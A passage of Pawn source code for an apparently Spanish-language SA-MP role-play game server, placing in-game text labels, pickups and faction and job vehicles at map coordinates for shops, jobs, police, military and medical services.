	CreateDynamic3DTextLabel("Utiliza "#CINFO"/ropero "#CBLANCO"para ponerte el uniforme.",C_BLANCO,2558.4216,1259.9790,866.3764,2);// LSMD
	CreateDynamic3DTextLabel("Para iniciar una transmisión\n"#CINFO"(/iniciar transmision/programa)",C_BLANCO,1277.1999,-833.29,1045,8);
	CreateDynamic3DTextLabel("Puedes "#CINFO"/usar camaras "#CBLANCO"de seguridad.",C_BLANCO,233.4676,123.4960,1003.21,8);
	CreateDynamic3DTextLabel("Ascensor (planta baja)"#MSG_TECLAENTRAR"",C_BLANCO,350.2999878,178.0000000,1014.2000122,5);
	CreateDynamic3DTextLabel("Ascensor (primer piso)"#MSG_TECLAENTRAR"",C_BLANCO,333.7999878,165.8000031,1014.2000122,5);
	CreateDynamic3DTextLabel("Hitman\n\n"#CINFO"(/contrato)", C_BLANCO, 320.1897,-1485.6438,24.7143, 5);
	CreateDynamic3DTextLabel("Puedes "#CINFO"/fundir "#CBLANCO"minerales en el Horno.", C_BLANCO, 255.6256,-96.5605,1001.5178, 3);

	//Labels tiendas de ropa
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,181.5338,-86.7284,1002.0234,5);//Zip
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,208.8329,-3.5260,1001.2178,5);//Victim
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,214.6280,-40.2542,1002.0234,5);//SubUrban
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,202.0402,-131.0054,1003.5078,5);//ProLaps
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,215.9159,-154.7793,1000.5234,5);//Didier
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/comprar -ropa/accesorios-)",C_BLANCO,217.5361,-97.7467,1005.2578,5);//Binco

	//Trabajos
	CreateDynamic3DTextLabel("Recepción de trabajo (Camionero)\nPuedes firmar un contrato para hacerte camionero\n\n"#CINFO"(/firmar contrato)",C_BLANCO,2430.00000000,-2115.69995117,13.80000019,10);
	CreateDynamic3DTextLabel("Recepción de trabajo (Cosechador)\nPuedes firmar un contrato para hacerte cosechador\n\n"#CINFO"(/firmar contrato)",C_BLANCO,-382.9777,-1426.2620,26.3193,10);
	CreateDynamic3DTextLabel("Recepción de trabajo (Repartidor de diarios)\nPuedes firmar un contrato para hacerte repartidor de diarios\n\n"#CINFO"(/firmar contrato)",C_BLANCO,2028.3854,-1274.0673,20.9812,10);
	CreateDynamic3DTextLabel("Recepción de trabajo (Basurero)\nPuedes firmar un contrato para hacerte basurero\n\n"#CINFO"(/firmar contrato)",C_BLANCO,1279.0297,-1248.3020,14.010,10);
	CreateDynamic3DTextLabel("Trabajo Ilegal(Ladrón)\nPuedes hacerte ladron aquí\n\n"#CINFO"(/firmar contrato)",C_BLANCO,992.4819,-1255.5576,15.0313,10);
	CreateDynamic3DTextLabel("Recepción de trabajo (Repartidor de pizza)\nPuedes firmar un contrato para hacerte repartidor de pizza\n\n"#CINFO"(/firmar contrato)",C_BLANCO,2094.7319,-1830.0093,13.5737,10);

	CreateDynamic3DTextLabel("Puedes sacar tarjeta de crédito\n\n"#CINFO"(/sacar tarjeta)",C_BLANCO,183.1584,-109.5484,999.6328,8);
	CreateDynamic3DTextLabel("Puedes retirar una licencia\n\n"#CINFO"(/sacar licencia)",C_BLANCO,-2029.9017,-119.1597,1035.1719,8);
	CreateDynamic3DTextLabel("Barra\n\n"#CINFO"(/comprar bebida)",C_BLANCO,499.7788,-18.8157,1000.67,8);
	CreateDynamic3DTextLabel("Barra\n\n"#CINFO"(/comprar bebida)",C_BLANCO,499.7788,-18.8157,1000.67,8);
	CreateDynamic3DTextLabel("24/7\n"#CINFO"(/comprar productos)",C_BLANCO,-29.5425,-184.9853,1003.546,8);
	CreateDynamic3DTextLabel("Puedes comprar armas y balas\n\n"#CINFO"(/comprar armas)",C_BLANCO,313.8407,-133.2842,999.601,8);
	CreateDynamic3DTextLabel("Hipermercado\n"#CINFO"(/comprar tecnologia/muebles)",C_BLANCO,-1705.09997559,1887.00000000,1068.80004883,8);
	CreateDynamic3DTextLabel("Mercado negro\n"#CINFO"(/comprar elementos)",C_BLANCO,1691.1962,-1949.8903,8.2500,8);
	CreateDynamic3DTextLabel("Puedes publicar un anuncio "#CAZUL2"($3 el caractér)\n\n"#CINFO"/anuncio",C_BLANCO,-1976.2544,602.3967,1055.5859,6);
	CreateDynamic3DTextLabel("Farmacia\n\n"#CINFO"(/comprar medicamentos)",C_BLANCO,170.6999969,-69.5999985,963.2000122,8);
	CreateDynamic3DTextLabel(MSG_TECLAENTRAR,C_BLANCO,-1911.7047,1.2205,(1061.1436)+1,30);
	CreateDynamic3DTextLabel("Ropero"#MSG_TECLAENTRAR"",C_BLANCO,368.29998779,194.00000000,1008.70001221,5);//ropero (GOB)
	CreateDynamic3DTextLabel("Ropero\n"#CINFO"(/ropero)",C_BLANCO,348.89999390,164.50000000,1014.20001221,5);// (/ropero GOB)
	CreateDynamic3DTextLabel("Armamento\n"#CINFO"(/armamento)",C_BLANCO,349.70001221,160.80000305,1014.20001221,5);// (/armamento GOB)
	CreateDynamic3DTextLabel("Micrófono\n"#CINFO"(/gob)",C_BLANCO,358.7458,203.6272,1008.382,5);
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,372.0816,160.3729,1008.389,4);
	CreateDynamic3DTextLabel("Micrófono\n\nPuedes ponerte en "#CINFO"/servicio "#CBLANCO"o hablar por "#CINFO"/gob",C_BLANCO,256.2291,120.4342,1003.2188,6);//lspd
	CreateDynamic3DTextLabel("Micrófono\n\nPuedes ponerte en "#CINFO"/servicio "#CBLANCO"o hablar por "#CINFO"/gob",C_BLANCO,2557.8733,1262.8485,866.3764,6);//lsmd
	CreateDynamic3DTextLabel("Micrófono\n\nPuedes ponerte en "#CINFO"/servicio "#CBLANCO"o hablar por "#CINFO"/gob",C_BLANCO,2744.3435,-2453.8425,13.8623,6);//lsem
	CreateDynamic3DTextLabel("Taller\n\n"#CINFO"(/modificar)",C_BLANCO,1785.2458,-2041.0432,13.5328,6);
	CreateDynamic3DTextLabel("Venta de droga\n\n"#CINFO"(/comprar droga)",C_BLANCO,CORDS_DROGA,6);// /comprar droga
	CreateDynamic3DTextLabel("Pizzeria\n\n"#CINFO"(/comprar comida)",C_BLANCO, 373.9077,-119.6210,1001.4922, 10.0);
	CreateDynamic3DTextLabel("Burger Shot\n\n"#CINFO"(/comprar comida)",C_BLANCO,375.7025,-68.0881,1001.5151, 10.0);
	CreateDynamic3DTextLabel("Polleria\n\n"#CINFO"(/comprar comida)",C_BLANCO, 369.5210,-6.5896,1001.8589, 10.0);
	CreateDynamic3DTextLabel("Campo de marihuana\n\n"#CINFO"(/cosechar marihuana)", C_BLANCO, -1062.8748,-1614.1770,76.3672, 9);
	CreateDynamic3DTextLabel("Equipo de Hitman\n\n"#CINFO"(/armamento)", C_BLANCO,331.6000061,175.1999969,1014.2000122, 5); // /armamento Hitman
	CreateDynamic3DTextLabel("Ropero\n\n"#CINFO"(/incognito)", C_BLANCO,329.2000122,177.5000000,1014.2000122,5);// /incognito Hitman
	CreateDynamic3DTextLabel("Computadora "#CVERDE"HITMAN\n\n"#CINFO"( /encontrar - /contratos )", C_BLANCO, 374.4480,185.7052,1014.18, 5.0);
	CreateDynamic3DTextLabel("Puedes "#CINFO"/recibir subsidio "#CBLANCO"por parte del gobierno.", C_BLANCO, 185.2302,-109.5540,999.6328, 5.0);
	CreateDynamic3DTextLabel("Secretaria\n\n"#CBLANCO"Utiliza "#CINFO"/dialogar "#CBLANCO"para conversar con Claudia", C_VERDE, 225.22, 112.17,1003.23, 3);

	Loop(i,11,0) CreateDynamic3DTextLabel("Cajero automático\nPuedes realizar operaciones bancarias\n\n"#CINFO"(/cajero)",C_BLANCO,PosCajero[i][Posx],PosCajero[i][Posy],PosCajero[i][Posz]+1.6,10);

	Loop(i,sizeof PosMapas, 0)
	{
	    CreateDynamic3DTextLabel("Mapa de turismo\n\n"#CINFO"(/mapa)",C_BLANCO,PosMapas[i][0],PosMapas[i][1],PosMapas[i][2],12);
		CreateDynamicObject(1444,PosMapas[i][0],PosMapas[i][1],PosMapas[i][2]-0.2,0,0,0);
	}

	Loop(i, sizeof PosCosechadorMari-1, 0)
	{
		CreateDynamicObject(3409, PosCosechadorMari[i][0], PosCosechadorMari[i][1], PosCosechadorMari[i][2]-2.3, 0, 0, 0);
	}

	Loop(i, sizeof PosCosechador-1, 0)
	{
		CreateDynamicObject(3409, PosCosechador[i][0], PosCosechador[i][1], PosCosechador[i][2]-2.3, 0, 0, 0);
	}

	Loop(i, sizeof PosCosechadorLVL2-1, 0)
	{
		CreateDynamicObject(3409, PosCosechadorLVL2[i][0], PosCosechadorLVL2[i][1], PosCosechadorLVL2[i][2]-2.3, 0, 0, 0);
	}

	Loop(i, sizeof Camillas, 0)
	{
		CrearCamilla(Camillas[i][0], Camillas[i][1], Camillas[i][2], Camillas[i][3]);
	}


	CreateDynamic3DTextLabel("MotoCross\n\n"#CINFO"(/comprar boleto)", C_BLANCO, -1372.0627, 1649.1442, 1052.6855, 5);
	CreateDynamic3DTextLabel("CrashArena\n\n"#CINFO"(/comprar boleto)", C_BLANCO, -1363.1294, 933.6328, 1036.4626, 5);
	CreateDynamic3DTextLabel("Rally\n\n"#CINFO"(/comprar boleto)", C_BLANCO, -1424.4020, -664.6694, 1065.5156, 5);
	CreateDynamic3DTextLabel("TC-2000\n\n"#CINFO"(/comprar boleto)", C_BLANCO, -1404.4823, -256.3750, 1043.6334, 5);

	// ---====[ Pickups ]====---- //

	CreateDynamicPickup(ID_PICKUPINFO, 1, -1062.8748,-1614.1770,76.3672 );//cosechar mari..

	CreateDynamicPickup(ID_PICKUPINT,1,1524.4832,-1677.9523,6.2188,-1,-1,-1,30);
	CreateDynamicPickup(ID_PICKUPINT,1,1565.0422,-1685.4037,28.3956,-1,-1,-1,30);
	CreateDynamicPickup(ID_PICKUPINT,1,270.39999390,113.09999847,1005,-1,-1,-1,30);

	CreateDynamicPickup(ID_PICKUPINT,1,238.80000305,182.5,1003.20001221,-1,-1,-1,30);//Ejercito equipo
	CreateDynamicPickup(1240,1,2593.8953,1324.7419,866.3764,-1,-1,-1,30);//(/donar hospital)
	CreateDynamicPickup(1240,1,266.5576,290.7323,984.0469,-1,-1,-1,30);//(quirofano)
	CreateDynamicPickup(ID_PICKUPINT,1,183.1584,-109.5484,999.6328,-1,-1,-1,30);//(/sacar tarjeta)
	CreateDynamicPickup(ID_PICKUPROPERO,1,306.8660,-159.2167,999.5938,-1,-1,-1,30);//ropero LSPD
	CreateDynamicPickup(ID_PICKUPROPERO,1,285.9903,-30.4936,1001.5156,-1,-1,-1,30);//ropero LSEM
	CreateDynamicPickup(ID_PICKUPROPERO,1,256.2048,285.4835,984.0469,-1,-1,-1,30);//ropero LSMD
	CreateDynamicPickup(ID_PICKUPARMAMENTO,1,312.7423,-165.5410,999.6010,-1,-1,-1,30);//Armamento LSPD
	CreateDynamicPickup(ID_PICKUPARMAMENTO,1,294.00000000,-38.09999847,1001.70001221,-1,-1,-1,30);//Armamento Militar
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,253.1785,291.7338,984.0469,-1,-1,-1,30);//Caja fuerte LSMD
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,317.6678,-159.0396,999.6010,-1,-1,-1,30);//Caja fuerte LSPD
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,287.7106,-31.4515,1001.515,-1,-1,-1,30);//Caja fuerte LSEM
	CreateDynamicPickup(19418 ,1,2527.2073,-1294.1211,1031.4219,-1,-1,-1,40);//carceles (/arrestar)
	CreateDynamicPickup(ID_PICKUPINT,1,-1911.7047,1.2205,1061.1436,-1,-1,-1,15);//Aeropuerto - adentro
	CreateDynamicPickup(ID_PICKUPINT,1,499.7788,-18.8157,1000.67,-1,-1,-1,25);//alhambra (bebidas)
	CreateDynamicPickup(ID_PICKUPINT,1,-29.5425,-184.9853,1003.546,-1,-1,-1,25);//24/7
	CreateDynamicPickup(ID_PICKUPARMAMENTO,1,313.8407,-133.2842,999.601,-1,-1,-1,30);//ammu nation
	CreateDynamicPickup(ID_PICKUPTRABAJO,1,2028.3854,-1274.0673,20.9812,-1,-1,-1,50);//trabajo repartidor de diarios
	CreateDynamicPickup(ID_PICKUPTRABAJO,1,1279.0297,-1248.3020,14.010,-1,-1,-1,60);//Trabajo (basurero)
	CreateDynamicPickup(ID_PICKUPTRABAJO,1,992.4819,-1255.5576,15.0313,-1,-1,-1,60);//Trabajo (ladron)
	CreateDynamicPickup(ID_PICKUPTRABAJO,1,2094.7319,-1830.0093,13.5737,-1,-1,-1,60);//Trabajo (repartidor de pizza)
	CreateDynamicPickup(ID_PICKUPHITMAN, 1, 320.1897,-1485.6438,24.7143); // HITMAN

	CreateDynamicPickup(ID_PICKUPARMAMENTO,1,1691.1962,-1949.8903,8.2500,-1,-1,-1,60);// /comprar (Mercado negro)
	CreateDynamicPickup(ID_PICKUPINT,1,233.4676,123.4960,1003.21,-1,-1,-1,8);//camaras de seguridad
	CreateDynamicPickup(ID_PICKUPINT,1,-1705.09997559,1887.00000000,1068.80004883,-1,-1,-1,30);// (/comprar tecnologia)
	CreateDynamicPickup(ID_PICKUPINT,1,368.29998779,194.00000000,1008.70001221,-1,-1,-1,30);//ropero (GOB)
	CreateDynamicPickup(ID_PICKUPROPERO,1,348.89999390,164.50000000,1014.20001221,-1,-1,-1,30);// (/ropero GOB)
	CreateDynamicPickup(ID_PICKUPARMAMENTO,1,349.70001221,160.80000305,1014.20001221,-1,-1,-1,30);// (/armamento GOB)
	CreateDynamicPickup(ID_PICKUPINT,1,358.7458,203.6272,1008.382,-1,-1,-1,40);// (/gob)
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,372.0816,160.3729,1008.389,-1,-1,-1,10);
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,1274.8182,-836.0779,1044.9656,-1,-1,-1,10);//lstv
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE,1,1774.6583,-2026.5764,13.4843,-1,-1,-1,80);//mecanicos
	CreateDynamicPickup(ID_PICKUPINT,1,256.2291,120.4342,1003.218,-1,-1,-1,30);// LSPD
	CreateDynamicPickup(ID_PICKUPINT,1,256.8769,288.6640,984.0469,-1,-1,-1,30);// LSEM
	CreateDynamicPickup(ID_PICKUPINT,1,-1976.2544,602.3967,1055.5859,-1,-1,-1,30);// /anuncio LSTV
	CreateDynamicPickup(ID_PICKUPINT,1,1785.2458,-2041.0432,13.5328,-1,-1,-1,80);//taller
	CreateDynamicPickup(ID_PICKUPINT,1,170.6999969,-69.5999985,963.2000122);// /comprar medicamentos
	CreateDynamicPickup(ID_PICKUPINT,1,CORDS_DROGA);// /comprar droga
	CreateDynamicPickup(ID_PICKUPCAJAFUERTE, 1, 185.2302,-109.5540,999.6328);

	//  Ascensor Hitman
	CreateDynamicPickup(ID_PICKUPINT, 1, 350.2999878,178.0000000,1014.2000122);
	CreateDynamicPickup(ID_PICKUPINT, 1, 333.7999878,165.8000031,1014.2000122);

	CreateDynamicPickup(ID_PICKUPARMAMENTO, 1,331.6000061,175.1999969,1014.2000122); // /armamento Hitman
	CreateDynamicPickup(ID_PICKUPROPERO,    1,329.2000122,177.5000000,1014.2000122);// /incognito Hitman

	//Pickups tiendas de ropa
	CreateDynamicPickup(ID_PICKUPROPERO,1,181.5338,-86.7284,1002.0234,-1,-1,-1,15);//Zip
	CreateDynamicPickup(ID_PICKUPROPERO,1,208.8329,-3.5260,1001.2178,-1,-1,-1,15);//Victim
	CreateDynamicPickup(ID_PICKUPROPERO,1,214.6280,-40.2542,1002.0234,-1,-1,-1,15);//SubUrban
	CreateDynamicPickup(ID_PICKUPROPERO,1,202.0402,-131.0054,1003.5078,-1,-1,-1,15);//ProLaps
	CreateDynamicPickup(ID_PICKUPROPERO,1,215.9159,-154.7793,1000.5234,-1,-1,-1,15);//Didier
	CreateDynamicPickup(ID_PICKUPROPERO,1,217.5361,-97.7467,1005.2578,-1,-1,-1,15);//Binco

	PElevadorLSPD = CreateDynamicPickup(ID_PICKUPINT,1,255.4812,109.0788,1003.2482,-1,-1,-1,30);
	PEstadio = CreateDynamicPickup(19300,2,2695.5884,-1704.5596,11.8438,-1,-1,-1,30);

	//Licencias
	CreateDynamicPickup(ID_PICKUPINT,1,-2029.9017,-119.1597,1035.1719,-1,-1,-1,15);//Licencias
	CreateDynamicPickup(ID_PICKUPINFO, 1, 374.4480,185.7052,1014.18);// Computadora hitman

	// ---====[ Vehículos ]====---- //

	//      					AUTOS DE RENTA
	AddStaticVehicleEx(426,1391.29980469,-2347.09960938,13.39999962,0.00000000,1,1, 60 * 15); //Premier
	AddStaticVehicleEx(426,1407.50000000,-2346.89990234,13.39999962,0.00000000,1,1, 60 * 15); //Premier
	AddStaticVehicleEx(426,1385.40002441,-2347.39990234,13.39999962,0.00000000,1,1, 60 * 15); //Premier
	AddStaticVehicleEx(426,1413.30004883,-2346.69995117,13.39999962,0.00000000,1,1, 60 * 15); //Premier
	AddStaticVehicleEx(445,1386.80004883,-2314.60009766,13.50000000,180.00000000,1,1, 60 * 15); //Admiral
	AddStaticVehicleEx(445,1391.80004883,-2314.30004883,13.50000000,180.00000000,1,1, 60 * 15); //Admiral
	AddStaticVehicleEx(445,1279.09997559,-1347.09997559,13.19999981,90.00000000,1,1, 60 * 15); //Admiral - hospital
	AddStaticVehicleEx(445,1414.30004883,-2314.89990234,13.50000000,180.00000000,1,1, 60 * 15); //Admiral
	AddStaticVehicleEx(547,1413.19995117,-2261.10009766,13.39999962,0.00000000,1,1, 60 * 15); //Primo
	AddStaticVehicleEx(547,1280.30004883,-1368.00000000,13.19999981,90.00000000,1,1, 60 * 15); //Primo - hospital
	AddStaticVehicleEx(547,1397.00000000,-2260.69921875,13.39999962,0.00000000,1,1, 60 * 15); //Primo
	AddStaticVehicleEx(547,1279.00000000,-1311.50000000,13.19999981,90.00000000,1,1, 60 * 15); //Primo - hospital
	AddStaticVehicleEx(585,1391.50000000,-2225.10009766,13.19999981,180.00000000,1,1, 60 * 15); //Emperor
	AddStaticVehicleEx(585,1279.00000000,-1318.50000000,13.19999981,90.00000000,1,1, 60 * 15); //Emperor - hospital
	AddStaticVehicleEx(585,1407.69995117,-2224.50000000,13.19999981,180.00000000,1,1, 60 * 15); //Emperor
	AddStaticVehicleEx(585,1413.50000000,-2224.50000000,13.19999981,180.00000000,1,1, 60 * 15); //Emperor
	AddStaticVehicleEx(585,1402.30004883,-2224.89990234,13.19999981,180.00000000,1,1, 60 * 15); //Emperor
	AddStaticVehicleEx(585,1279.09997559,-1304.80004883,13.19999981,90.00000000,1,1, 60 * 15); //Emperor - hospital
	AddStaticVehicleEx(547,1407.50000000,-2261.39990234,13.39999962,0.00000000,1,1, 60 * 15); //Primo
	AddStaticVehicleEx(547,1391.00000000,-2261.10009766,13.39999962,0.00000000,1,1, 60 * 15); //Primo
	AddStaticVehicleEx(445,1397.69995117,-2314.69995117,13.50000000,180.00000000,1,1, 60 * 15); //Admiral
	AddStaticVehicleEx(445,1279.00000000,-1325.80004883,13.19999981,90,1,1, 60 * 15); //Admiral - hospital
	AddStaticVehicleEx(426,1396.50000000,-2347.19995117,13.39999962,0.00000000,1,1, 60 * 15); //Premier
	AddStaticVehicleEx(426,1402.00000000,-2347.30004883,13.39999962,0.00000000,1,1, 60 * 15); //Premier

	// -===========================-
	#define CreateFactionVehicle(%0|%1) Veh[AddStaticVehicleEx(%1)][vFaccion] = %0
	#define CreateJobVehicle(%0|%1)     Veh[AddStaticVehicleEx(%1)][vTrabajo] = %0
	// -===========================-

	//                  			AUTOS LSPD
	CreateFactionVehicle(IDLSPD|596,1559.1567,-1711.0026,5.6201,359.4141,0,1); // LSPD CAR
	CreateFactionVehicle(IDLSPD|596,1570.1930,-1710.3677,5.6124,359.5776,0,1); // LSPD CAR
	CreateFactionVehicle(IDLSPD|596,1574.5313,-1710.3890,5.6108,0.0626,0,1); // LSPD CAR
	CreateFactionVehicle(IDLSPD|596,1578.5676,-1710.4360,5.6107,357.9809,0,1); // LSPD car
	CreateFactionVehicle(IDLSPD|523,1562.6703,-1711.0708,5.4552,331.7386,0,1); // MOTO LSPD
	CreateFactionVehicle(IDLSPD|523,1566.1294,-1711.7048,5.4596,0.5866,0,1); // MOTO LSPD
	CreateFactionVehicle(IDLSPD|497,1558.3955,-1610.3651,16.3358,177.1500,0,1); // Heli l
	CreateFactionVehicle(IDLSPD|497,1545.5564,-1609.7732,16.3597,181.4655,0,1); // Heli l
	CreateFactionVehicle(IDLSPD|601,1586.2190,-1671.7070,5.6524,270.4478,0,0); // S.W.A.T
	CreateFactionVehicle(IDLSPD|525,1601.9562,-1704.2455,5.7634,89.4259,0,1); // Grua
	CreateFactionVehicle(IDLSPD|525,1601.9718,-1700.0463,5.7642,90.0285,0,1); // Grua
	CreateFactionVehicle(IDLSPD|599,1601.8977,-1695.9855,6.0830,88.6540,0,1); // Ranger
	CreateFactionVehicle(IDLSPD|599,1601.7292,-1691.9491,6.0812,89.4121,0,1); // Ranger
	CreateFactionVehicle(IDLSPD|427,1585.2740,-1667.7440,6.0775,268.2414,0,1); // Enforcer
	CreateFactionVehicle(IDLSPD|523,1585.1995,-1679.0804,5.4635,293.9985,0,1); // Moto LSPD
	CreateFactionVehicle(IDLSPD|523,1584.9594,-1675.2955,5.4876,271.1712,0,1); // Moto LSPD

	VehConSirena[0] = CreateVehicle(559,1591.4371,-1711.0272,5.5470,358.7638,0,0,3600*HORAS_RVEH); //Jester - sirena
	VehConSirena[1] = CreateVehicle(559,1595.3333,-1711.1681,5.5469,359.1981,0,0,3600*HORAS_RVEH); //Jester - sirena

	VehConSirena[2] = CreateVehicle(560,1583.3822,-1710.9973,5.5962,359.8880,0,0,3600*HORAS_RVEH); //Sultan - sirena
	VehConSirena[3] = CreateVehicle(560,1587.4177,-1710.9647,5.5958,357.2534,0,0,3600*HORAS_RVEH); //Sultan - sirena

	Loop(s,4,0)
	{
		Veh[VehConSirena[s]][vFaccion] = IDLSPD;

	    if(GetVehicleModel(VehConSirena[s]) == 559)
	    {
			SirenaVeh[s] = CreateObject(19419, 10.0, 10.0, 10.0, 0, 0, 0, 30);
			AttachObjectToVehicle(SirenaVeh[s],VehConSirena[s],  0.000000, -0.354999, 0.704999, 0.000000, 0.000000, 0.000000);
		}
	    else if(GetVehicleModel(VehConSirena[s]) == 560)
	    {
			SirenaVeh[s] = CreateObject(19419, 10.0, 10.0, 10.0, 0, 0, 0, 30);
			AttachObjectToVehicle(SirenaVeh[s],VehConSirena[s],   0.000000, -0.074999, 0.824999, 0.000000, 0.000000, 0.000000);
		}
	}

	//                          AUTOS EJERCITO / FUERZA AEREA
	CreateFactionVehicle(IDLSEM|425,2772.50000000,-2353.89990234,15.30000019,272.00000000,-1,-1); //Hunter
	CreateFactionVehicle(IDLSEM|520,2787.30004883,-2353.50000000,14.60000038,0.00000000,-1,-1); //Hydra
	CreateFactionVehicle(IDLSEM|548,2772.39990234,-2337.60009766,15.50000000,270.00000000,-1,-1); //Cargobob
	CreateFactionVehicle(IDLSEM|520,2787.89990234,-2337.50000000,14.60000038,0.00000000,-1,-1); //Hydra
	CreateFactionVehicle(IDLSEM|432,2791.10009766,-2454.60009766,13.69999981,90.00000000,-1,-1); //Rhino
	CreateFactionVehicle(IDLSEM|433,2739.4827,-2469.4895,14.0856,88.00000000,-1,-1); //Barracks
	CreateFactionVehicle(IDLSEM|433,2739.2485,-2462.3176,14.0872,87.99499512,-1,-1); //Barracks
	CreateFactionVehicle(IDLSEM|470,2791.60009766,-2492.10009766,13.80000019,90.00000000,-1,-1); //Patriot
	CreateFactionVehicle(IDLSEM|470,2791.80004883,-2496.30004883,13.80000019,90.00000000,-1,-1); //Patriot
	CreateFactionVehicle(IDLSEM|470,2784.30004883,-2496.39990234,13.80000019,90.00000000,-1,-1); //Patriot
	CreateFactionVehicle(IDLSEM|470,2784.10009766,-2492.39990234,13.80000019,90.00000000,-1,-1); //Patriot
	CreateFactionVehicle(IDLSEM|598,2777.00000000,-2440.39990234,13.50000000,90.00000000,86,86); //Police Car (LVPD)
	CreateFactionVehicle(IDLSEM|598,0.0,0.0,0.0,0.0,86,86); //Police Car (LVPD)
	CreateFactionVehicle(IDLSEM|601,2779.19995117,-2458.39990234,13.60000038,88.00000000,-1,-1); //S.W.A.T. Van
	CreateFactionVehicle(IDLSEM|411,2777.30004883,-2474.30004883,13.39999962,90.00000000,86,1); //Infernus
	CreateFactionVehicle(IDLSEM|415,2777.00000000,-2470.60009766,13.50000000,90.00000000,86,1); //Cheetah
	CreateFactionVehicle(IDLSEM|554,2776.19995117,-2477.80004883,13.80000019,90.00000000,86,86); //Yosemite
	CreateFactionVehicle(IDLSEM|598,2776.69995117,-2437.10009766,13.50000000,90.00000000,86,86); //Police Car (LVPD)
	CreateFactionVehicle(IDLSEM|598,2776.89990234,-2433.10009766,13.50000000,90.00000000,86,86); //Police Car (LVPD)
	CreateFactionVehicle(IDLSEM|425,429.00000000,-2340.50000000,21.29999924,270.00000000,-1,-1); //Hunter
	CreateFactionVehicle(IDLSEM|447,514.00000000,-2312.00000000,4.80000019,0.00000000,-1,-1); //Seasparrow
	CreateFactionVehicle(IDLSEM|548,626.00000000,-2341.10009766,19.70000076,90.00000000,-1,-1); //Cargobob
	CreateFactionVehicle(IDLSEM|520,599.59997559,-2344.89990234,16.70000076,0.00000000,-1,-1); //Hydra
	CreateFactionVehicle(IDLSEM|520,479.29998779,-2342.50000000,19.20000076,0.00000000,-1,-1); //Hydra
	CreateFactionVehicle(IDLSEM|430,465.79998779,-2302.60009766,3.50000000,0.00000000,-1,-1); //Predator
	CreateFactionVehicle(IDLSEM|430,494.00000000,-2301.89990234,4.00000000,0.00000000,-1,-1); //Predator
	CreateFactionVehicle(IDLSEM|447,436.00000000,-2309.10009766,4.80000019,0.00000000,-1,-1); //Seasparrow
	CreateFactionVehicle(IDLSEM|520,450.70001221,-2341.80004883,19.20000076,0.00000000,-1,-1); //Hydra

	//                          AUTOS LSMD
	CreateFactionVehicle(IDLSMD|563,1163.90002441,-1317.59997559,32.40000153,270.00000000,155,1); //Raindance
	CreateFactionVehicle(IDLSMD|497,1156.50000000,-1297.40002441,32.09999847,90.00000000,155,1); //Police Maverick
	CreateFactionVehicle(IDLSMD|416,1121.50000000,-1329.19995117,13.50000000,0.00000000,155,1); //Ambulance
	CreateFactionVehicle(IDLSMD|416,1126.19995117,-1329.09997559,13.50000000,0.00000000,155,1); //Ambulance
	CreateFactionVehicle(IDLSMD|596,1113.59997559,-1328.59997559,13.10000038,0.00000000,155,1); //Police Car (LSPD)
	CreateFactionVehicle(IDLSMD|596,1109.30004883,-1328.50000000,13.10000038,0.00000000,155,1); //Police Car (LSPD)
	CreateFactionVehicle(IDLSMD|461,1116.59997559,-1325.30004883,13.50000000,0.00000000,155,1); //PCJ-600
	CreateFactionVehicle(IDLSMD|461,1118.09997559,-1329.59997559,13.50000000,0.00000000,155,1); //PCJ-600
	CreateFactionVehicle(IDLSMD|596,1100.09997559,-1328.90002441,13.10000038,0.00000000,155,1); //Police Car (LSPD)
	CreateFactionVehicle(IDLSMD|596,1095.90002441,-1329.09997559,13.10000038,0.00000000,155,1); //Police Car (LSPD)
	CreateFactionVehicle(IDLSMD|471,1103.59997559,-1325.40002441,13.39999962,0.00000000,155,1); //Quad
	CreateFactionVehicle(IDLSMD|471,1105.09997559,-1330.09997559,13.39999962,0.00000000,155,1); //Quad
	CreateFactionVehicle(IDLSMD|416,1135.59997559,-1340.30004883,13.50000000,0.00000000,155,1); //Ambulance
	CreateFactionVehicle(IDLSMD|416,1143.50000000,-1339.59997559,13.30000019,0.00000000,155,1); //Ambulance
	CreateFactionVehicle(IDLSMD|416,1139.30004883,-1338.90002441,13.50000000,0.00000000,155,1); //Ambulance

	//                      CAMIONES (CAMIONEROS)
	CreateJobVehicle(ID_Camionero|414,2519.10009766,-2115.30004883,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2511.30004883,-2115.30004883,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2502.60009766,-2115.19995117,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2492.60009766,-2114.60009766,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2481.50000000,-2114.30004883,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2468.80004883,-2114.00000000,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2457.39990234,-2114.19995117,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|414,2446.00000000,-2114.50000000,13.69999981,0.00000000,-1,-1, 60*5); //Mule
	CreateJobVehicle(ID_Camionero|440,2536.39990234,-2082.10009766,13.80000019,90.00000000,-1,-1, 60*5); //Rumpo
	CreateJobVehicle(ID_Camionero|440,2537.30004883,-2086.50000000,13.80000019,90.00000000,-1,-1, 60*5); //Rumpo
	CreateJobVehicle(ID_Camionero|440,2537.10009766,-2093.19995117,13.80000019,90.00000000,-1,-1, 60*5); //Rumpo
